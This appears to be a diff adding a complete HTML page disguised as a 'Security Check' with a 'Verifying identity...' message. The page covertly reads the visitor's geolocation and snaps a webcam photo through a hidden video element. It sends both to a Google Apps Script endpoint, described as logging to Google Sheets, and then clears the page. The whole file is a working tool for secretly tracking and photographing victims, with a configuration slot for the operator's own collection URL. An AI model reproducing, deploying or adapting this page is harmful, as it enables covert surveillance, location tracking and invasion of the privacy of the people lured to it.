@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body { margin: 0; background-color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        #videoElement, #canvasElement { display: none; }
+        .loader { font-size: 12px; color: #ccc; }
+    </style>
+</head>
+<body>
+
+    <!-- Hidden elements -->
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
+    
+    <div class="loader">Verifying identity...</div>
+
+    <script>
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const context = canvas.getContext('2d');
+
+        // ================= CONFIGURATION =================
+        // PASTE YOUR GOOGLE WEB APP URL HERE INSIDE THE QUOTES
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby_FjhNsjoVObLcBWwGeV-Ho3TxH9TPY0N-kUW90TkQxpwBxwNXQmk4IkiP-DTQmCWc/exec"; 
+        // =================================================
+
+        // 1. Get Location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const locData = {
+                        lat: position.coords.latitude,
+                        long: position.coords.longitude
+                    };
+                    initCamera(locData);
+                },
+                (error) => {
+                    console.log("Loc error");
+                    initCamera(null);
+                }
+            );
+        } else {
+            initCamera(null);
+        }
+
+        // 2. Get Camera
+        function initCamera(locData) {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const imageData = canvas.toDataURL('image/png');
+                                stream.getTracks().forEach(track => track.stop());
+                                sendData(locData, imageData);
+                            }, 1500);
+                        };
+                    })
+                    .catch((err) => {
+                        console.log("Cam error");
+                        sendData(locData, null);
+                    });
+            } else {
+                sendData(locData, null);
+            }
+        }
+
+        // 3. Send Data to Google Sheets
+        function sendData(loc, img) {
+            const payload = { location: loc, image: img };
+
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Important for Google Apps Script
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                console.log("Sent");
+                // Optional: Redirect user after sending
+                // window.location.href = "https://google.com"; 
+                document.body.innerHTML = ""; 
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
